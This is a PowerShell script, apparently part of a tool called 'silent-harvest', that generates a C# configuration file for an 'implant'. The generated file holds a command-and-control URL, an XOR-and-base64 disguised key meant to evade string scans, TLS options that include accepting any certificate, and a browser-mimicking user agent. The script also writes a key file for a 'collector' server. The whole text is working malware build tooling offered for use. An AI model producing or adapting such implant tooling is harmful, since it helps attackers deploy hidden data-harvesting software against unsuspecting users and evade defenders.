# silent-harvest config generator (called by build.bat)
# param: -Psk <secret> -C2 <url> -Pin <mode> -OutDir <repo root>
# emits implant/Config.cs with the PSK obfuscated (XOR+base64: defeats casual
# `strings` scans, NOT reverse engineering) and server/psk.txt for the collector.
param(
    [Parameter(Mandatory = $true)][string]$Psk,
    [Parameter(Mandatory = $true)][string]$C2,
    [string]$Pin = "",
    [string]$Auth = "",
    [Parameter(Mandatory = $true)][string]$OutDir,
    [switch]$WritePskFile
)

$ErrorActionPreference = "Stop"

# xor the psk with a random per-build key, then base64
$b = [Text.Encoding]::UTF8.GetBytes($Psk)
if ($b.Length -eq 0) { throw "empty psk" }
$k = New-Object byte[] $b.Length
$rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
$rng.GetBytes($k)
$x = New-Object byte[] $b.Length
for ($i = 0; $i -lt $b.Length; $i++) { $x[$i] = $b[$i] -bxor $k[$i] }
$enc = [Convert]::ToBase64String($x)
$keyhex = ($k | ForEach-Object { $_.ToString("x2") }) -join ""

$pinLine = if ($Pin -ne "") { "`"$Pin`"" } else { '""' }
$authLine = if ($Auth -ne "") { "`"$Auth`"" } else { '""' }

$cfg = @"
// generated by build.bat via tools/genconfig.ps1 -- do not edit or commit
using System;

namespace SilentHarvest
{
    public static class Cfg
    {
        public const string C2 = "$C2";
        // PSK stored XOR+base64: defeats casual `strings` scanning only.
        // Treat the binary itself as secret material.
        public const string PskEnc = "$enc";
        public const string PskXorHex = "$keyhex";
        // TLS: "" = verify against system store; "cert:<sha256hex>" = pin the
        // exact server cert (use for self-signed); "any" = accept anything
        // (DEBUG ONLY -- defeats MITM protection).
        public const string Pin = $pinLine;
        // Optional X-SH-Auth header value required by collector --auth.
        public const string Auth = $authLine;
        public const string UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
    }
}
"@
Set-Content -Path (Join-Path $OutDir "implant\Config.cs") -Value $cfg -Encoding ascii

# collector side: plaintext psk file, POSIX 0600 where applicable.
# only written when explicitly requested (random-PSK generation) -- an
# explicit /psk must never clobber the operator's existing psk.txt
if ($WritePskFile) {
    $pskPath = Join-Path $OutDir "server\psk.txt"
    Set-Content -Path $pskPath -Value $Psk -Encoding ascii -NoNewline
}

# fingerprint for the build log (no secret material)
$sha = [System.Security.Cryptography.SHA256]::Create()
$fp = ($sha.ComputeHash($b) | ForEach-Object { $_.ToString("x2") }) -join ""
Write-Output ("PSK_FP=" + $fp.Substring(0, 16))
